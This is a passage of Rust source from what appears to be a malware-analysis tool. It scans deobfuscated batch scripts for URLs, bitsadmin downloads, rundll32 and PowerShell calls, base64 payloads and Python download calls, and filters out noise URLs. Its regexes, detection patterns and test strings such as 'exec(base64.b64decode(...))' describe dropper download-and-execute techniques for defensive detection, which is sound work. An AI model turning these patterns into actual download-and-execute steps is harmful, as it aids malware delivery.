//! Final URL sweep over the deobfuscated batch text. Catches URLs that
//! were normalized into the output but didn't pass through any specific
//! handler (set values, echo content, start arguments, etc.).
//!
//! Dedups against URLs already surfaced by Download/CertutilDownload/
//! BitsadminDownload traits.

#![allow(clippy::expect_used, clippy::type_complexity, clippy::unwrap_used)]

use crate::env::{Config, Environment};
use crate::handlers::util::{flag_url_value_after, split_words};
use crate::traits::Trait;
use once_cell::sync::Lazy;
use regex::Regex;
use std::collections::{HashMap, HashSet};

#[allow(clippy::expect_used)]
// Case-insensitive AND tolerant of Windows' liberal slash normalization:
// WinINet / IE / PS Invoke-WebRequest all accept `http:\\evil.com`,
// `http:/evil.com`, `http:\/evil.com`, `http:////evil.com` etc. — any
// run of one or more `/` or `\` after the colon. Obfuscators exploit
// this with `hTtPs:\\` to dodge naive `https://` scanners.
// `[\x2f\x5c]+` = one-or-more forward-slash or backslash.
pub(crate) static URL_RE: Lazy<Regex> = Lazy::new(|| {
    // Also exclude `;` (PS statement separator), backtick (PS escape),
    // and comma — these terminate URLs in real CMD/PS source. Square
    // brackets are allowed so forensic URLs such as `/[a]/payload` are
    // preserved; unmatched trailing brackets are trimmed after capture.
    Regex::new(r#"(?i)\b(https?:[\x2f\x5c]+[^\s"'<>(){}|^&;`,]+|ftp:[\x2f\x5c]+[^\s"'<>(){}|^&;`,]+|file:[\x2f\x5c]+[^\s"'<>(){}|^&;`,]+)"#)
        .expect("url sweep regex")
});

#[allow(clippy::expect_used)]
static UNC_WEBDAV_RE: Lazy<Regex> = Lazy::new(|| {
    // Matches:  \\<host>@<port>\<share>...
    // Where host is IP or hostname, port is digits or "SSL", share is anything non-whitespace
    Regex::new(r"(?i)\\\\([A-Za-z0-9.\-]+)@([A-Za-z0-9]+)\\([A-Za-z0-9._\-/\\]+)")
        .expect("unc webdav regex")
});

#[allow(clippy::expect_used)]
static BARE_UNC_WEBDAV_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)\\\\([A-Za-z0-9.\-]+)\\webdav\\[^\s"'<>(){}\[\]|^&;`,]+"#)
        .expect("bare unc webdav regex")
});

static IP_DISCOVERY_HOSTS: &[&str] = &[
    "api.ipify.org",
    "ipv4.icanhazip.com",
    "icanhazip.com",
    "checkip.dyndns.org",
    "checkip.amazonaws.com",
    "ifconfig.me",
    "ip-api.com",
    "ipinfo.io",
    "www.geoplugin.net",
    "reallyfreegeoip.org",
];

#[allow(clippy::expect_used)]
static BITSADMIN_WORD_RE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"(?i)\bbitsadmin(?:\.exe)?\b").expect("bitsadmin word regex"));

#[allow(clippy::expect_used)]
static CMD_URL_VAR_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)\bset\s+"?([A-Za-z_][A-Za-z0-9_.$-]*)\s*=\s*['"]?((?:https?|ftp|file):[\x2f\x5c]+[^\s"'<>(){}|^&;`,]+)"#,
    )
    .expect("cmd URL variable regex")
});

#[allow(clippy::expect_used)]
static CMD_SCHEMELESS_URL_VAR_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)\bset\s+"?([A-Za-z_][A-Za-z0-9_.$-]*url[A-Za-z0-9_.$-]*)\s*=\s*['"]?([A-Za-z0-9-]+(?:\.[A-Za-z0-9-]+)+/[^\s"'<>(){}|^&;`,]+)"#,
    )
    .expect("cmd schemeless URL variable regex")
});

#[allow(clippy::expect_used)]
static PS_URL_VAR_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)(?:^|[^\w])\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*["']((?:https?|ftp|file):[\x2f\x5c]+[^"']+)["']"#,
    )
    .expect("PowerShell URL variable regex")
});

#[allow(clippy::expect_used)]
static PS_SCHEMELESS_URL_VAR_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)(?:^|[^\w])\$([A-Za-z_][A-Za-z0-9_]*url[A-Za-z0-9_]*)\s*=\s*["']([A-Za-z0-9-]+(?:\.[A-Za-z0-9-]+)+/[^"']+)["']"#,
    )
    .expect("PowerShell schemeless URL variable regex")
});

#[allow(clippy::expect_used)]
static GLUED_RUNDLL32_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)(?:^|[^A-Za-z0-9_.-])(rundll32([A-Za-z0-9_.~$%{}\\/:-]{1,260}\.[A-Za-z0-9]{2,8})\s*,\s*[A-Za-z0-9_#@$.-]{1,80})"#,
    )
    .expect("glued rundll32 regex")
});

#[allow(clippy::expect_used)]
static SPACED_RUNDLL32_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)(?:^|[&|;]\s*)(rundll32(?:\.exe)?\s+(?:"([^"\r\n]+)"|([^"'\s\r\n,]+))\s*,\s*[A-Za-z0-9_#@$.-]{1,80})"#,
    )
    .expect("spaced rundll32 regex")
});

#[allow(clippy::expect_used)]
static EMBEDDED_POWERSHELL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)(?:[A-Za-z]:\\[^\s"']*\\)?(?:powershell|pwsh)(?:\.exe)?\b"#)
        .expect("embedded PowerShell regex")
});

#[allow(clippy::expect_used)]
// Same URL-char restrictions as URL_RE: exclude shell/PS terminators
// (`;`, `,`, `)`, `(`, etc.) so `... 'URL'); other-stmt` doesn't capture
// past the URL into the next statement.
static PROCESS_URL_ARG_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)(?:^|[\s(])(?:[A-Za-z]:\\)?[^\s"()]+?\.(?:exe|com|scr|bat|cmd)\s+["']((?:https?|file):[\x2f\x5c]+[^\s"'<>(){}|^&;`,]+)["']"#)
        .expect("process URL argument regex")
});

#[allow(clippy::expect_used)]
static B64_INLINE_RE: Lazy<Regex> = Lazy::new(|| {
    // Matches: FromBase64String('...') or FromBase64String("...").
    // Upper bound 8000 chars (~6 KB decoded) so we still catch the
    // Data.ps1 / Datanew.ps1 / yenisc2.ps1 / stub.ps1 family where the
    // whole script is one FromBase64String literal carrying the C2
    // URLs inside the decoded PS body. Keep a cap so a 5 MB blob
    // doesn't pin us in a doomed base64-decode loop.
    Regex::new(r#"FromBase64String\s*\(\s*["']([A-Za-z0-9+/=]{20,8000})["']\s*\)"#)
        .expect("b64 inline regex")
});

/// Returns true for well-known noise URLs that appear in binary-embedded
/// certificate metadata, XMP image data, or ad-network assets.
/// Returns true for IP literals that should not be treated as C2: private
/// RFC1918 ranges, loopback, link-local, multicast, broadcast, and the
/// unspecified address. Called from sweeps that emit `http://<ip>/...`
/// URLs.
fn is_noise_ip(ip_url: &str) -> bool {
    // url is of form http(s)://<ip>[:port][/path]. Case-insensitive
    // scheme + Windows-liberal slashes (`HTTPS://`, `http:\\`, `http:/`).
    let url_lc = ip_url.to_ascii_lowercase();
    let rest = ["http:", "https:"]
        .iter()
        .find_map(|scheme| url_lc.strip_prefix(scheme));
    let Some(rest) = rest else { return false };
    let rest = rest.trim_start_matches(['/', '\\']);
    // Take everything up to ':', '/', '\', or end.
    let host = rest.split([':', '/', '\\']).next().unwrap_or("");
    let parts: Vec<&str> = host.split('.').collect();
    if parts.len() != 4 {
        return false;
    }
    let octets: Vec<Option<u8>> = parts.iter().map(|p| p.parse::<u8>().ok()).collect();
    let (a, b, _, _) = match (octets[0], octets[1], octets[2], octets[3]) {
        (Some(a), Some(b), Some(c), Some(d)) => (a, b, c, d),
        _ => return false,
    };
    match (a, b) {
        (0, _) => true,         // 0.0.0.0/8
        (10, _) => true,        // RFC1918
        (127, _) => true,       // loopback
        (169, 254) => true,     // link-local
        (172, 16..=31) => true, // RFC1918
        (192, 168) => true,     // RFC1918
        (224..=239, _) => true, // multicast
        (240..=255, _) => true, // reserved + broadcast
        _ => false,
    }
}

pub fn is_noise_url(url: &str) -> bool {
    if is_noise_ip(url) {
        return true;
    }
    if has_bare_non_ip_host(url) {
        return true;
    }
    if url.chars().any(|c| c.is_control() || c == '\u{fffd}') {
        return true;
    }
    // Unresolved FOR-loop variable (`%%X`) or stray bare `%` in the URL —
    // the parser couldn't expand a runtime-bound value, so the URL has a
    // literal `%%B` / `%%I` etc. in its host or path. win.bat
    // (fb8bb3cf…) used `for /f ... in ('ping …')` whose pipeline can't
    // resolve statically, leaving `set ipaddress=%%B` → `set url=http://%%B`.
    // Report it as a NetworkProbe or similar at most, not as a real URL IOC.
    if url.contains("%%") {
        return true;
    }
    // A single bare `%` followed by an unresolved var name suggests the
    // var lookup silently dropped (e.g. `http://%publicIP%/`).
    if url.contains('%') {
        // Allow `%XX` URL-encoded escapes; reject `%NAME` style.
        let bytes = url.as_bytes();
        let mut i = 0;
        while i < bytes.len() {
            if bytes[i] == b'%' {
                let n1 = bytes.get(i + 1).copied();
                let n2 = bytes.get(i + 2).copied();
                let is_hex_pair = matches!(n1, Some(c) if c.is_ascii_hexdigit())
                    && matches!(n2, Some(c) if c.is_ascii_hexdigit());
                if !is_hex_pair {
                    return true;
                }
                i += 3;
                continue;
            }
            i += 1;
        }
    }
    let lower = url.to_ascii_lowercase();

    if NOISE_EXACT_URLS.contains(&lower.as_str()) {
        return true;
    }
    if NOISE_URL_PREFIXES
        .iter()
        .any(|prefix| lower.starts_with(prefix))
    {
        return true;
    }
    if NOISE_URL_SUBSTRINGS
        .iter()
        .any(|needle| lower.contains(needle))
    {
        return true;
    }
    false
}

pub fn is_noise_structured_download_url(url: &str) -> bool {
    if !url.contains('%') {
        return is_noise_url(url);
    }
    if url.contains("%%") {
        return true;
    }

    let bytes = url.as_bytes();
    let mut normalized = String::with_capacity(url.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%' {
            let n1 = bytes.get(i + 1).copied();
            let n2 = bytes.get(i + 2).copied();
            let is_hex_pair = matches!(n1, Some(c) if c.is_ascii_hexdigit())
                && matches!(n2, Some(c) if c.is_ascii_hexdigit());
            if is_hex_pair {
                normalized.push('%');
                normalized.push(bytes[i + 1] as char);
                normalized.push(bytes[i + 2] as char);
                i += 3;
                continue;
            }
            normalized.push_str("%25");
            i += 1;
            continue;
        }
        normalized.push(bytes[i] as char);
        i += 1;
    }

    is_noise_url(&normalized)
}

// Exact URL strings (lowercase) that appear in corpus samples as embedded
// page assets or attribution links — never C2.
const NOISE_EXACT_URLS: &[&str] = &[
    // GitHub embed / scrape leakage
    "https://github.githubassets.com",
    "https://avatars.githubusercontent.com",
    "https://github-cloud.s3.amazonaws.com",
    "https://user-images.githubusercontent.com",
    "https://desktop.github.com",
    "https://docs.github.com",
    "https://raw.githubuserc", // truncated capture in some samples
    "https://github.com",
    "https://github.com/features",
    "https://github.com/topics",
    "https://github.com/trending",
    "https://github.com/collections",
    "https://github.com/security",
    "https://github.com/enterprise",
    "https://github.com/team",
    "https://github.com/readme",
    "https://github.blog",
    "https://skills.github.com",
    "https://resources.github.com",
    "https://partner.github.com",
    "https://github.com/fluidicon.png",
    "https://github.com/ch2sh/batcloak",
    "https://github.com/baum1810",
    "https://massgrave.dev/troubleshoot",
    // XML / schema absolutes
    "http://www.w3.org/2000/svg",
    "http://schema.org/softwaresourcecode",
    "http://www.w3.org/2001/xmlschema-instance",
    // Microsoft / SysInternals attribution
    "http://www.microsoft.com/exporting",
    "https://docs.microsoft.com/windows/win32/fileio/maximum-file-path-limitation",
    "https://learn.microsoft.com/windows/win32/fileio/maximum-file-path-limitation",
    "http://technet.microsoft.com/sysinternals",
    "http://www.sysinternals.com",
    "https://www.sysinternals.com",
    "https://www.sysinternals.com0",
    "http://www.microsoft.com/drm/sl/genuineauthorization/1.0",
    // Vendor attribution
    "http://sawebservice.red-gate.com/",
];

// URL prefixes (lowercase). Hostname-or-path noise that appears with any
// trailing chars but the leading path identifies it as page asset / legal
// boilerplate.
const NOISE_URL_PREFIXES: &[&str] = &[
    "https://docs.github.com/",
    "https://resources.github.com/",
    "https://support.github.com",
    "https://www.githubstatus.com/",
    "https://github.com/features/",
    "https://github.com/about/",
    "https://github.com/customer-stories",
    "https://github.com/solutions/",
    "https://github.com/enterprise/",
    "https://github.com/resources/",
    "https://github.com/pricing",
    "https://github.com/login",
    "https://github.com/signup",
    "https://github.com/topics/",
    "http://www.apache.org/licenses/",
];

// URL substrings (lowercase). Used for hostnames / paths that show up
// anywhere within the URL — typically embedded cert-chain noise leaking out
// of DER-encoded blobs partially decoded into text.
const NOISE_URL_SUBSTRINGS: &[&str] = &[
    // GitHub page-asset hosts (caught via "host/" substring even when the
    // full URL has any path).
    "github.githubassets.com/",
    "avatars.githubusercontent.com/",
    "github-cloud.s3.amazonaws.com/",
    "user-images.githubusercontent.com/",
    "opengraph.githubassets.com/",
    "collector.github.com/",
    "api.github.com/_private/browser/",
    // X.509 cert chain noise from PE certificate tables surfaced as text
    "digicert.com/cps",
    "digicert.com/crl",
    "ocsp.digicert.com",
    "crl.digicert.com",
    "ocsp.usertrust.com",
    "crl.usertrust.com",
    "www.usertrust.com",
    "ocsp2.globalsign.com",
    "secure.globalsign.com/cacert/",
    "globalsign.com/repository/",
    "crl.microsoft.com",
    "ocsp.microsoft.com",
    "microsoft.com/pki/certs/",
    "crt.sectigo.com",
    "ocsp.sectigo.com",
    "crl.sectigo.com",
    "sectigo.com/cps",
    "ocsp.thawte.com",
    "ocsp.verisign.com",
    "verisign.com/rpa",
    "logo.verisign.com/",
    "crl.verisign.com/",
    "csc3-2010-crl.verisign.com/",
    "ts-ocsp.ws.symantec.com",
    "ts-aia.ws.symantec.com",
    "ts-crl.ws.symantec.com",
    "d.symcb.com/",
    "s.symcb.com/",
    "ocsp.comodoca.com",
    "secure.comodo.net/cps",
    // NSIS installer error page — appears in every NSIS-built dropper PE
    // tail (43 corpus samples are PE-renamed `.bat`); pure infrastructure
    // URL, not the malware's C2.
    "nsis.sf.net/nsis_error",
    "s.symcd.com",
    "ts-ocsp.thawte.com",
    "ts-aia.thawte.com",
    "ts-crl.thawte.com",
    "ocsp.thawte.com",
    // XMP / image metadata URIs
    "ns.adobe.com/",
    "purl.org/dc/",
    "w3.org/1999/02/22-rdf-syntax-ns",
    "w3.org/xml/1998/namespace",
    "schemas.microsoft.com/",
    "schemas.dmtf.org/wbem/wsman/",
    "schemas.openxmlformats.org/markup-compatibility/",
    "iptc.org/std/",
    "xmp.gettyimages.com/",
    "ns.useplus.org/",
    "aiim.org/pdfa/ns/",
    "red-gate.com/products/dotnet-development/smartassembly",
    "www.smartassembly.com/webservices/",
    "chiark.greenend.org.uk/~sgtatham/putty/",
    "tempuri.org/",
    "autoitscript.com/autoit3/",
    // Stock photo / template attribution
    "commons.wikimedia.org/wiki/file:",
    "www.iec.ch",
    "istockphoto.com/legal/license-agreement",
    "istockphoto.com/photo/license",
    // UI resource templates / app about-box links in recovered binaries
    "www.youtube.com/embed/",
    "player.vimeo.com/video/",
    "ok.ru/videoembed/",
    "music.yandex.ru/iframe/",
    "www.google.com/maps/place/",
    "sourceforge.net/p/compactview",
    "www.cyotek.com",
    "www.skinstudio.net",
    // Common ad networks / analytics in legitimate page assets
    "doubleclick.net",
    "googletagmanager.com",
    "google-analytics.com",
];

fn has_bare_non_ip_host(url: &str) -> bool {
    // Case-insensitive scheme + tolerate Windows-liberal slashes
    // (`http:\\X`, `http:/X`, `http:////X`) — `strip_prefix("http://")`
    // alone would miss `HTTP://`/`hTtPs://`/`http:\\` etc.
    let url_lc = url.to_ascii_lowercase();
    let rest = ["http:", "https:", "ftp:"]
        .iter()
        .find_map(|scheme| url_lc.strip_prefix(scheme));
    let Some(rest) = rest else { return false };
    let rest = rest.trim_start_matches(['/', '\\']);
    let host = rest.split([':', '/', '?', '#', '\\']).next().unwrap_or("");
    if host.is_empty() || host.eq_ignore_ascii_case("localhost") {
        return true;
    }
    if host.parse::<std::net::IpAddr>().is_ok() {
        return false;
    }
    !host.contains('.')
}

fn is_known_or_known_query_prefix(known: &std::collections::HashSet<String>, url: &str) -> bool {
    if known.contains(url) {
        return true;
    }
    known.iter().any(|known_url| {
        known_url.strip_prefix(url).is_some_and(|suffix| {
            suffix.starts_with('&')
                || suffix.starts_with('?')
                || (url.eq_ignore_ascii_case("https://api.telegram.org/bot") && !suffix.is_empty())
        })
    })
}

pub(crate) fn is_noise_url_context(line: &str, url: &str) -> bool {
    let lower_line = line.to_ascii_lowercase();
    let lower_url = url.to_ascii_lowercase();
    if lower_line.contains(r#"<meta name="go-import""#)
        && lower_url.starts_with("https://github.com/")
        && lower_url.ends_with(".git")
    {
        return true;
    }
    false
}

fn strip_quotes(s: &str) -> &str {
    let s = s.trim();
    if s.len() >= 2
        && ((s.starts_with('"') && s.ends_with('"')) || (s.starts_with('\'') && s.ends_with('\'')))
    {
        &s[1..s.len() - 1]
    } else {
        s
    }
}

fn trim_html_quote_entity_suffix(mut token: &str) -> &str {
    loop {
        let Some(trimmed) = token
            .strip_suffix("&quot")
            .or_else(|| token.strip_suffix("&apos"))
            .or_else(|| token.strip_suffix("&#039"))
            .or_else(|| token.strip_suffix("&#34"))
            .or_else(|| token.strip_suffix("&#x27"))
            .or_else(|| token.strip_suffix("&#X27"))
        else {
            return token;
        };
        token = trimmed;
    }
}

pub(crate) fn normalize_liberal_url_token(token: &str) -> Option<String> {
    let mut token = token.trim().trim_matches(['"', '\'']);
    let end = token
        .find(['"', '\'', ')', '}', ';', ',', '`', '<', '>'])
        .unwrap_or(token.len());
    token = &token[..end];
    token = trim_liberal_url_suffix(token);
    token = trim_html_quote_entity_suffix(token);

    let lower = token.to_ascii_lowercase();
    for scheme in ["http", "https", "ftp", "file"] {
        let prefix = format!("{scheme}:");
        let Some(rest) = lower.strip_prefix(&prefix) else {
            continue;
        };
        if !rest.starts_with(['/', '\\']) {
            continue;
        }
        let raw_rest = &token[prefix.len()..];
        if scheme == "file" {
            let slash_count = raw_rest
                .chars()
                .take_while(|c| matches!(c, '/' | '\\'))
                .count();
            let rest = raw_rest.trim_start_matches(['/', '\\']).replace('\\', "/");
            if rest.is_empty() {
                return None;
            }
            if slash_count >= 2 && !rest.as_bytes().get(1).is_some_and(|b| *b == b':') {
                return Some(format!("file://{rest}"));
            }
            return Some(format!("file:///{rest}"));
        }
        let rest = raw_rest.trim_start_matches(['/', '\\']);
        if rest.is_empty() {
            return None;
        }
        return Some(format!("{scheme}://{}", rest.replace('\\', "/")));
    }
    None
}

pub(crate) fn trim_liberal_url_suffix(mut token: &str) -> &str {
    loop {
        let Some(last) = token.chars().last() else {
            return token;
        };
        let trim = match last {
            '.' | ',' | ';' | ':' | '\\' | '"' | '\'' | '!' | '?' | '&' => true,
            ')' => trailing_closer_is_unbalanced(token, '(', ')'),
            ']' => trailing_closer_is_unbalanced(token, '[', ']'),
            '}' => trailing_closer_is_unbalanced(token, '{', '}'),
            _ => false,
        };
        if !trim {
            return token;
        }
        token = &token[..token.len() - last.len_utf8()];
    }
}

fn trailing_closer_is_unbalanced(token: &str, opener: char, closer: char) -> bool {
    token.chars().filter(|c| *c == closer).count() > token.chars().filter(|c| *c == opener).count()
}

pub(crate) fn normalize_schemeless_domain_path_token(token: &str) -> Option<String> {
    let token = strip_quotes(token).trim();
    let token = token.trim_end_matches(['.', ',', ';', ':', '\\']);
    let token = trim_html_quote_entity_suffix(token);
    let (host, path) = token.split_once('/')?;
    if host.is_empty() || path.is_empty() || host.contains('\\') || host.contains(':') {
        return None;
    }
    if !host.split('.').all(|label| {
        !label.is_empty() && label.chars().all(|c| c.is_ascii_alphanumeric() || c == '-')
    }) {
        return None;
    }
    let tld = host.rsplit('.').next()?;
    if host.contains('.') && tld.len() >= 2 && tld.chars().all(|c| c.is_ascii_alphabetic()) {
        return Some(format!("http://{host}/{path}"));
    }
    None
}

pub(crate) fn looks_like_liberal_url(token: &str) -> bool {
    normalize_liberal_url_token(token).is_some()
}

fn contains_liberal_url_scheme(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    ["http:", "https:", "ftp:", "file:"]
        .iter()
        .any(|scheme| lower.contains(scheme))
}

fn scan_bitsadmin_deob_text(deobfuscated: &str, env: &mut Environment) {
    let mut known: std::collections::HashSet<String> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::BitsadminDownload { url, .. } => Some(url.clone()),
            _ => None,
        })
        .collect();

    for line in deobfuscated.lines() {
        let lower = line.to_ascii_lowercase();
        if !(lower.contains("/transfer")
            || lower.contains("/addfile")
            || lower.contains("/setnotifycmdline"))
            || !lower.contains("bitsadmin")
        {
            continue;
        }

        for bits_match in BITSADMIN_WORD_RE.find_iter(line) {
            let tail = &line[bits_match.start()..];
            let segment = first_unquoted_ampersand_segment(tail);
            let tokens = split_words(segment);
            let lower_tokens: Vec<String> = tokens.iter().map(|s| s.to_ascii_lowercase()).collect();
            if lower_tokens
                .iter()
                .any(|t| bitsadmin_deob_flag_matches(t, "/setnotifycmdline"))
            {
                crate::handlers::bitsadmin::h_bitsadmin(segment, env);
                continue;
            }
            if !lower_tokens.iter().any(|t| {
                bitsadmin_deob_flag_matches(t, "/transfer")
                    || bitsadmin_deob_flag_matches(t, "/addfile")
            }) {
                continue;
            }

            let mut i = 1;
            while i < tokens.len() {
                let token = strip_quotes(&tokens[i]).to_string();
                let token_lower = token.to_ascii_lowercase();
                if token_lower == "/priority" {
                    i += 2;
                    continue;
                }
                if bitsadmin_deob_skip_flag(&token_lower) || token_lower == "foreground" {
                    i += 1;
                    continue;
                }
                if let Some(url) = normalize_liberal_url_token(&token)
                    .or_else(|| normalize_schemeless_domain_path_token(&token))
                {
                    let dst = tokens
                        .get(i + 1)
                        .map(|s| strip_quotes(s).to_string())
                        .unwrap_or_default();
                    if known.insert(url.clone()) {
                        push_lolbas_once(env, "bitsadmin", line);
                        env.traits.push(Trait::BitsadminDownload { url, dst });
                    }
                    i += 2;
                    continue;
                }
                i += 1;
            }
        }
    }
}

fn bitsadmin_deob_skip_flag(token: &str) -> bool {
    ["/transfer", "/addfile", "/download", "/upload", "/priority"]
        .iter()
        .any(|flag| bitsadmin_deob_flag_matches(token, flag))
        || token.starts_with('/')
}

fn bitsadmin_deob_flag_matches(token: &str, flag: &str) -> bool {
    token == flag
        || token
            .strip_prefix(flag)
            .and_then(|rest| rest.as_bytes().first())
            .is_some_and(|byte| matches!(*byte, b':' | b'='))
}

fn first_unquoted_ampersand_segment(text: &str) -> &str {
    let mut in_dq = false;
    let mut in_sq = false;
    for (idx, c) in text.char_indices() {
        if c == '"' && !in_sq {
            in_dq = !in_dq;
            continue;
        }
        if c == '\'' && !in_dq {
            in_sq = !in_sq;
            continue;
        }
        if c == '&' && !in_dq && !in_sq {
            return &text[..idx];
        }
    }
    text
}

fn scan_python_requests_get_deob_text(deobfuscated: &str, env: &mut Environment) {
    let has_direct_download = has_python_direct_download_scan_atom(deobfuscated);
    let has_base64_decode = has_python_base64_decode_scan_atom(deobfuscated);
    if !has_direct_download && !has_base64_decode {
        return;
    }
    let python_profile_enabled = std::env::var_os("HARRINGTON_PROFILE_PYTHON_SCAN").is_some();
    macro_rules! profile_python_group {
        ($stage:literal, $body:block) => {{
            let profile_start = python_profile_enabled.then(std::time::Instant::now);
            let result = $body;
            if let Some(profile_start) = profile_start {
                eprintln!(
                    "harrington_profile_python_scan stage={} delta_ms={} bytes={}",
                    $stage,
                    profile_start.elapsed().as_millis(),
                    deobfuscated.len()
                );
            }
            result
        }};
    }

    let mut known: std::collections::HashSet<String> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::Download { src, .. } => Some(src.clone()),
            _ => None,
        })
        .collect();

    if has_direct_download {
        profile_python_group!("direct_urlopen_get", {
            let urlopen_names = python_urlopen_call_names(deobfuscated);
            let urlopen_name_refs = urlopen_names.iter().map(String::as_str).collect::<Vec<_>>();
            for url in find_call_url_literals(deobfuscated, &urlopen_name_refs) {
                emit_python_download(&url, deobfuscated, env, &mut known);
            }
        });
        profile_python_group!("direct_request", {
            for url in find_python_requests_request_literals(deobfuscated) {
                emit_python_download(&url, deobfuscated, env, &mut known);
            }
        });
        profile_python_group!("direct_urlretrieve", {
            for (url, dst) in find_python_urlretrieve_literals(deobfuscated) {
                emit_python_download_with_dst(&url, dst.as_deref(), deobfuscated, env, &mut known);
            }
        });
    }

    if has_base64_decode {
        let decoded_payloads = profile_python_group!("decode_b64_literals", {
            decoded_python_b64decode_literals(deobfuscated)
        });
        profile_python_group!("decoded_payload_scan", {
            for decoded in decoded_payloads {
                let decoded_urlopen_names = python_urlopen_call_names(&decoded);
                let decoded_urlopen_name_refs = decoded_urlopen_names
                    .iter()
                    .map(String::as_str)
                    .collect::<Vec<_>>();
                for url in find_call_url_literals(&decoded, &decoded_urlopen_name_refs) {
                    emit_python_download(&url, &decoded, env, &mut known);
                }
                for url in find_python_requests_request_literals(&decoded) {
                    emit_python_download(&url, &decoded, env, &mut known);
                }
                for (url, dst) in find_python_urlretrieve_literals(&decoded) {
                    emit_python_download_with_dst(&url, dst.as_deref(), &decoded, env, &mut known);
                }
            }
        });
    }
}

#[cfg(test)]
fn has_python_download_scan_atom(text: &str) -> bool {
    has_python_direct_download_scan_atom(text) || has_python_base64_decode_scan_atom(text)
}

fn has_python_direct_download_family_atom(text: &str) -> bool {
    ["request", "httpx", "urllib", "urlopen", "urlretrieve"]
        .iter()
        .any(|atom| find_ascii_case_insensitive(text, atom, 0).is_some())
}

fn has_python_direct_download_scan_atom(text: &str) -> bool {
    if !has_python_direct_download_family_atom(text) {
        return false;
    }
    [
        "requests.get",
        "requests.post",
        "requests.put",
        "requests.patch",
        "requests.delete",
        "requests.head",
        "requests.options",
        "requests.request",
        "httpx.get",
        "httpx.post",
        "httpx.put",
        "httpx.patch",
        "httpx.delete",
        "httpx.head",
        "httpx.options",
        "httpx.request",
        "httpx.client",
        "urllib.",
        "urlopen(",
        "urlretrieve(",
        "import requests",
        "import httpx",
        "import urllib",
        "from requests",
        "from httpx",
        "from urllib",
        "__import__('requests')",
        "__import__(\"requests\")",
        "__import__('httpx')",
        "__import__(\"httpx\")",
        "__import__('urllib')",
        "__import__(\"urllib\")",
    ]
    .iter()
    .any(|atom| find_ascii_case_insensitive(text, atom, 0).is_some())
}

fn has_python_base64_decode_scan_atom(text: &str) -> bool {
    ["b64decode", "urlsafe_b64decode"]
        .iter()
        .any(|atom| find_ascii_case_insensitive(text, atom, 0).is_some())
}

#[cfg(test)]
mod python_download_prefilter_tests {
    use super::{has_python_direct_download_family_atom, has_python_download_scan_atom};

    #[test]
    fn prefilter_allows_direct_download_apis() {
        assert!(has_python_download_scan_atom(
            "import requests; requests.get('https://example.test/p')"
        ));
        assert!(has_python_download_scan_atom(
            "urllib.request.urlopen('https://example.test/p')"
        ));
    }

    #[test]
    fn prefilter_allows_python_base64_decoders() {
        assert!(has_python_download_scan_atom(
            "exec(base64.b64decode('aW1wb3J0IHVybGxpYg=='))"
        ));
        assert!(has_python_download_scan_atom(
            "from base64 import b64decode as dec; exec(dec(payload))"
        ));
        assert!(has_python_download_scan_atom(
            "exec(base64.urlsafe_b64decode(payload))"
        ));
    }

    #[test]
    fn prefilter_blocks_base64_import_without_decoder() {
        assert!(!has_python_download_scan_atom(
            "import base64; print(base64.standard_b64encode(b'data'))"
        ));
    }

    #[test]
    fn prefilter_blocks_html_prose_with_python_words() {
        assert!(!has_python_download_scan_atom(
            r#"<a href="/pulls">Pull requests</a><link href="https://example.test/urllib-doc.css">"#
        ));
    }

    #[test]
    fn direct_family_prefilter_blocks_python_and_urls_without_download_apis() {
        assert!(!has_python_direct_download_family_atom(
            "python http://example.test/a ".repeat(128).as_str()
        ));
        assert!(has_python_direct_download_family_atom(
            "import requests; requests.get('https://example.test/p')"
        ));
        assert!(has_python_direct_download_family_atom(
            "urllib.request.urlopen('https://example.test/p')"
        ));
        assert!(has_python_direct_download_family_atom(
            "import httpx; httpx.Client().get('https://example.test/p')"
        ));
    }
}

fn python_urlopen_call_names(text: &str) -> Vec<String> {
    let mut names = vec![
        "requests.get".to_string(),
        "httpx.get".to_string(),
        "urllib.request.urlopen".to_string(),
        "urllib.urlopen".to_string(),
    ];
    for method in ["get", "post", "put", "patch", "delete", "head", "options"] {
        if method != "get" {
            names.push(format!("requests.{method}"));
            names.push(format!("httpx.{method}"));
        }
        names.extend(collect_python_httpx_method_aliases(text, method));
        names.extend(collect_python_httpx_client_method_aliases(text, method));
        names.extend(collect_python_httpx_bound_client_method_aliases(
            text, method,
        ));
        names.extend(collect_python_httpx_bound_client_assigned_method_aliases(
            text, method,
        ));
        names.extend(collect_python_requests_method_aliases(text, method));
        names.extend(collect_python_requests_session_method_aliases(text, method));
        names.extend(collect_python_requests_bound_session_method_aliases(
            text, method,
        ));
    }
    names.extend(collect_python_urllib_call_aliases(text, "urlopen"));
    names
}

fn collect_python_httpx_method_aliases(text: &str, target_method: &str) -> Vec<String> {
    if !contains_ascii_case_insensitive_atom(text, b"httpx") {
        return Vec::new();
    }

    #[allow(clippy::expect_used)]
    static PY_FROM_HTTPX_IMPORT_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?is)\bfrom\s+httpx\s+import\s*(?:\(([^)]{0,512})\)|([^;"'\r\n]+))"#)
            .expect("python httpx from import regex")
    });

    let module_aliases = collect_python_httpx_module_aliases(text);
    let mut aliases: Vec<String> = module_aliases
        .iter()
        .map(|alias| format!("{alias}.{target_method}"))
        .collect();
    for caps in PY_FROM_HTTPX_IMPORT_RE.captures_iter(text).take(8) {
        let Some(imports) = caps.get(1).or_else(|| caps.get(2)).map(|m| m.as_str()) else {
            continue;
        };
        for part in imports.split(',') {
            let part = part.trim().trim_matches(['(', ')']);
            let words: Vec<&str> = part.split_ascii_whitespace().collect();
            let Some(method) = words.first().copied() else {
                continue;
            };
            if method != target_method {
                continue;
            }
